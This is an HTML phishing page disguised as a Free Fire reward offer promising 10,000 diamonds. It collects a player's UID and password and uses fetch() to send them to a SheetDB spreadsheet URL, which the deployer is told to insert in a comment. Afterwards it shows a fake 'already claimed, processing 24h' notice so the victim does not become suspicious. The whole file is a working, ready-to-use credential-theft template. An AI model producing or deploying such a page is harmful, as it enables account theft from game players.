<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Rewards</title>
    <style>
        body { margin: 0; font-family: sans-serif; background: #0a0a0a; display: flex; justify-content: center; align-items: center; height: 100vh; color: white; }
        .login-box { background: #1a1a1a; padding: 30px; border-radius: 10px; width: 300px; text-align: center; border: 1px solid #444; }
        input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #333; background: #000; color: #fff; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #ff4500; border: none; color: white; font-weight: bold; cursor: pointer; border-radius: 5px; margin-top: 10px; }
        #status-msg { margin-top: 15px; font-weight: bold; color: #ffea00; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2 id="title">VERIFY UID</h2>
        <form id="sheetdb-form">
            <input type="text" name="data[FF_ID]" placeholder="Free Fire UID" required>
            <input type="password" name="data[Verification_Code]" placeholder="Security Password" required>
            <button type="submit" id="submit-btn">CLAIM 10,000 💎</button>
        </form>
        <div id="status-msg"></div>
    </div>

    <script>
        const form = document.getElementById('sheetdb-form');
        const statusMsg = document.getElementById('status-msg');

        // Check if already submitted
        if (localStorage.getItem('ff_claimed') === 'true') {
            form.style.display = 'none';
            document.getElementById('title').innerText = "NOTICE";
            statusMsg.innerHTML = "You have already claimed your rewards!<br><small>Processing: 24h</small>";
        }

        form.addEventListener("submit", e => {
            e.preventDefault();
            const btn = document.getElementById('submit-btn');
            btn.innerText = "Processing...";
            btn.disabled = true;

            // REPLACE THE URL BELOW WITH YOUR SHEETDB API URL
            fetch('YOUR_SHEETDB_API_URL_HERE', {
                method: 'POST',
                body: new FormData(document.getElementById("sheetdb-form")),
            }).then(response => {
                localStorage.setItem('ff_claimed', 'true');
                window.location.reload(); // This will show the "Already claimed" message
            });
        });
    </script>
</body>
</html>
